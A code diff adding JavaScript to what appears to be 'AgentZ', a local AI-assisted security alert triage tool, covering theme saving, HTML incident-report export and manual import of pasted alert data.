+  try { localStorage.setItem('agentz_theme', isLight ? 'light' : 'dark'); } catch {}
+}
+
+function loadTheme() {
+  try {
+    const saved = localStorage.getItem('agentz_theme');
+    if (saved === 'light') {
+      document.body.classList.add('light');
+      document.getElementById('themeBtn').textContent = '☀';
+    }
+  } catch {}
+}
+
+// ── EXPORT HTML REPORT ──
+function exportHTMLReport() {
+  const inc = S.incidents.find(i => i.id === S.selectedId);
+  if (!inc) return;
+  if (!inc.analysis) { toast('No analysis yet — run Re-Analyze first', 'high'); return; }
+
+  const sevColors = {
+    critical: '#ef4444', high: '#f97316', medium: '#f59e0b', low: '#22c55e', info: '#94a3b8'
+  };
+  const sevColor = sevColors[inc.severity] || '#94a3b8';
+  const exported  = new Date().toLocaleString();
+  const analysisHTML = fmtAnalysis(inc.analysis);
+  const rawJSON   = esc(JSON.stringify(inc.raw, null, 2));
+
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>AgentZ Report — ${esc(inc.title)}</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap">
+<style>
+  :root {
+    --bg:#080b10; --bg2:#0d1117; --bg3:#111720;
+    --border:#1e2736; --text:#e2e8f0; --text2:#8b97aa; --text3:#4a5568;
+    --accent:${sevColor}; --blue:#3b82f6; --green:#22c55e;
+    --sans:'Inter','Segoe UI',system-ui,sans-serif;
+    --mono:'JetBrains Mono','Consolas',monospace;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:var(--sans); background:var(--bg); color:var(--text); padding:32px 24px; line-height:1.6; }
+  .page { max-width:820px; margin:0 auto; }
+
+  .report-header { display:flex; align-items:flex-start; gap:16px; margin-bottom:28px; padding-bottom:20px; border-bottom:2px solid var(--accent); }
+  .brand { display:flex; align-items:center; gap:10px; margin-bottom:16px; }
+  .brand-mark { width:36px;height:36px; background:linear-gradient(135deg,#3b82f6,#a78bfa); border-radius:10px; display:flex;align-items:center;justify-content:center; font-family:var(--mono);font-weight:700;font-size:15px;color:#fff; }
+  .brand-name { font-size:16px;font-weight:700; }
+  .brand-sub  { font-size:10px;color:var(--text3);letter-spacing:2px;text-transform:uppercase; }
+  .report-title { font-size:20px;font-weight:700;letter-spacing:-0.5px;margin-bottom:8px; }
+  .sev-badge { display:inline-block;padding:3px 10px;border-radius:5px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;background:${sevColor}22;color:${sevColor};border:1px solid ${sevColor}55; }
+
+  .meta-row { display:flex;flex-wrap:wrap;gap:8px;margin:12px 0 0; }
+  .meta-tag { padding:4px 10px;background:var(--bg2);border:1px solid var(--border);border-radius:5px;font-size:11px;color:var(--text2);font-family:var(--mono); }
+
+  .section { margin-bottom:24px; }
+  .section-title { font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:2px;color:var(--blue);margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid var(--border); }
+
+  .analysis-box { background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px 22px;font-size:13px;line-height:1.8;color:var(--text2);white-space:pre-wrap;word-break:break-word; }
+  .analysis-box strong { color:var(--text); }
+
+  .raw-box { background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:16px 18px;font-family:var(--mono);font-size:11px;color:var(--text2);white-space:pre;overflow-x:auto;max-height:420px;overflow-y:auto; }
+
+  .footer { margin-top:32px;padding-top:16px;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;font-size:10px;color:var(--text3);font-family:var(--mono); }
+  .footer a { color:var(--blue);text-decoration:none; }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="brand">
+    <div class="brand-mark">Z</div>
+    <div>
+      <div class="brand-name">AgentZ</div>
+      <div class="brand-sub">SOC Level AI</div>
+    </div>
+  </div>
+
+  <div class="report-header">
+    <div style="flex:1">
+      <div class="report-title">${esc(inc.title)}</div>
+      <span class="sev-badge">${inc.severity}</span>
+      <div class="meta-row">
+        <span class="meta-tag">&#x1F4E1; ${esc(inc.source)}</span>
+        <span class="meta-tag">&#x1F554; ${new Date(inc.timestamp).toLocaleString()}</span>
+        <span class="meta-tag">&#x1F4CB; Status: ${inc.status}</span>
+        <span class="meta-tag">&#x1F4C5; Exported: ${exported}</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">AI Analysis</div>
+    <div class="analysis-box">${analysisHTML}</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Raw Alert Data</div>
+    <div class="raw-box">${rawJSON}</div>
+  </div>
+
+  <div class="footer">
+    <span>Generated by AgentZ &mdash; all analysis ran locally via Ollama</span>
+    <span>${exported}</span>
+  </div>
+
+</div>
+</body>
+</html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `agentz-report-${Date.now()}.html`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+  toast('HTML report exported', 'ok');
+  log('Exported HTML report: ' + inc.title, 'success');
+}
+
+// ── MANUAL IMPORT ──
+function openManualModal() {
+  document.getElementById('manualRaw').value    = '';
+  document.getElementById('manualTitle').value  = '';
+  document.getElementById('manualSource').value = '';
+  document.getElementById('manualSev').value    = 'auto';
+  document.getElementById('manualModal').classList.add('open');
+  setTimeout(() => document.getElementById('manualRaw').focus(), 80);
+}
+
+function closeManualModal() {
+  document.getElementById('manualModal').classList.remove('open');
+}
+
+function submitManualAlert(analyze) {
+  const rawText = document.getElementById('manualRaw').value.trim();
+  if (!rawText) { toast('Paste some alert data first', 'high'); return; }
+
+  let parsed;
+  try {
+    parsed = JSON.parse(rawText);
+  } catch {
+    parsed = { text: rawText };
+  }
+
+  let title = document.getElementById('manualTitle').value.trim();
+  const source      = document.getElementById('manualSource').value.trim() || 'Manual Import';
+  const sevOverride = document.getElementById('manualSev').value;
+
+  if (!title) {
+    title = parsed.title         || parsed.name          || parsed.alert_name
+         || parsed.rule?.name    || parsed.summary       || parsed.description
+         || parsed.threatInfo?.threatName
+         || ('Manual Import — ' + new Date().toLocaleTimeString('en-GB'));
+  }
+
+  const severity = sevOverride === 'auto'
+    ? mapSev(parsed.severity       || parsed.urgency      || parsed.priority
+          || parsed.risk_score     || parsed.confidenceLevel
+          || parsed.threatInfo?.confidenceLevel || 'medium')
+    : sevOverride;
+
+  const timestamp = parsed.timestamp  || parsed.created_at  || parsed.createdAt
+                 || parsed['@timestamp'] || parsed.createdDateTime
+                 || new Date().toISOString();
+
+  const alert = {
+    id: 'manual-' + Date.now(),
+    title, severity, source, timestamp, raw: parsed
+  };
+
+  closeManualModal();
+  addIncident(alert);
+  selectIncident(alert.id);
+  log('Manual import: ' + title, 'success');
+  toast('Imported: ' + title, 'ok');
+
+  if (analyze) analyzeIncident(alert.id);
+}
+
+// ── INIT ──
+loadSettings();
+loadTheme();
+log('AgentZ loaded — SOC Level AI — all processing is local', 'success');
+log('Open Settings (⚙) to configure Ollama and SIEM, then start the agent', 'info');
+</script>
+</body>
+</html>
